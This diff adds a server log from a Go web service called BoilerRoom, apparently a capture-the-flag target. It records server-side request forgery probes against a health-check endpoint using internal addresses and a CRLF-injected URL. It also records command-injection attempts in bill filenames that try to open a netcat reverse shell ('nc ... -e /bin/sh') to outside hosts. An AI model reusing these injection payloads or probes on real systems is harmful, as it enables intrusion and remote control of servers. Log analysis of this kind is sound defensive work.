@@ -1,0 +1,40 @@
+2025/11/17 12:53:41 DB IS OK
+2025/11/17 12:54:35 SUCCESS ON HEALTHCHECK
+URL: http://127.0.0.1:5555/internal/orders?localhost
+STATUS CODE: %!s(int=200)
+2025/11/17 12:57:09 RESPONSE ERROR ON HEALTHCHECK: Head "http://10.200.200.2:1234/localhost": dial tcp 10.200.200.2:1234: i/o timeout
+URL: http://10.200.200.2:1234/localhost
+2025/11/17 12:57:40 RESPONSE ERROR ON HEALTHCHECK: Head "http://0.0.0.0:8000/localhost": dial tcp 0.0.0.0:8000: connect: connection refused
+URL: http://0.0.0.0:8000/localhost
+2025/11/17 13:00:54 SUCCESS ON HEALTHCHECK
+URL: http://10.200.200.2:1234/localhost
+STATUS CODE: %!s(int=101)
+2025/11/17 13:00:54 SUCCESS ON ORDERS
+2025/11/17 13:00:54 http: superfluous response.WriteHeader call from github.com/andreika47/BoilerRoom/controller.(*OrderController).Orders (order.go:305)
+2025/11/17 13:01:45 SUCCESS ON HEALTHCHECK
+URL: http://127.0.0.1:5555/internal/orders?localhost
+STATUS CODE: %!s(int=200)
+2025/11/17 13:02:21 SUCCESS ON HEALTHCHECK
+URL: http://localhost:5555/internal/orders
+STATUS CODE: %!s(int=200)
+2025/11/17 13:05:06 REQUEST ERROR ON HEALTHCHECK: parse "http://localhost:8080/internal/orders\r\nGET /internal/orders HTTP/1.1": net/url: invalid control character in URL
+URL: http://localhost:8080/internal/orders
+GET /internal/orders HTTP/1.1
+2025/11/17 13:09:21 SUCCESS ON HEALTHCHECK
+URL: http://10.200.200.2:1234/localhost
+STATUS CODE: %!s(int=101)
+2025/11/17 13:09:21 SUCCESS ON ORDERS
+2025/11/17 13:09:21 http: superfluous response.WriteHeader call from github.com/andreika47/BoilerRoom/controller.(*OrderController).Orders (order.go:305)
+2025/11/17 13:19:46 SUCCESS ON NEW ORDER
+USER: hacker
+2025/11/17 13:19:46 http: superfluous response.WriteHeader call from github.com/andreika47/BoilerRoom/controller.(*OrderController).NewOrder (order.go:91)
+2025/11/17 13:21:35 CREATE FILE ERROR ON GET BILL: exit status 127
+FILENAME: c9c897d1dd096a3964c558118403c528449777153db7679b28de0b41c6283c40_for_1.1.1.1, ; nc 10.60.0.104 4444 -e /bin/sh;.data
+2025/11/17 13:21:35 READ FILE BYTES ERROR ON GET BILL: open /tmp/c9c897d1dd096a3964c558118403c528449777153db7679b28de0b41c6283c40_for_1.1.1.1, ; nc 10.60.0.104 4444 -e /bin/sh;.data: no such file or directory
+FILENAME: c9c897d1dd096a3964c558118403c528449777153db7679b28de0b41c6283c40_for_1.1.1.1, ; nc 10.60.0.104 4444 -e /bin/sh;.data
+2025/11/17 13:21:35 http: superfluous response.WriteHeader call from github.com/andreika47/BoilerRoom/controller.(*OrderController).GetBill (order.go:285)
+2025/11/17 13:21:58 CREATE FILE ERROR ON GET BILL: exit status 127
+FILENAME: c9c897d1dd096a3964c558118403c528449777153db7679b28de0b41c6283c40_for_1.1.1.1, ; nc 10.200.200.2 4444 -e /bin/sh;.data
+2025/11/17 13:21:58 READ FILE BYTES ERROR ON GET BILL: open /tmp/c9c897d1dd096a3964c558118403c528449777153db7679b28de0b41c6283c40_for_1.1.1.1, ; nc 10.200.200.2 4444 -e /bin/sh;.data: no such file or directory
+FILENAME: c9c897d1dd096a3964c558118403c528449777153db7679b28de0b41c6283c40_for_1.1.1.1, ; nc 10.200.200.2 4444 -e /bin/sh;.data
+2025/11/17 13:21:58 http: superfluous response.WriteHeader call from github.com/andreika47/BoilerRoom/controller.(*OrderController).GetBill (order.go:285)
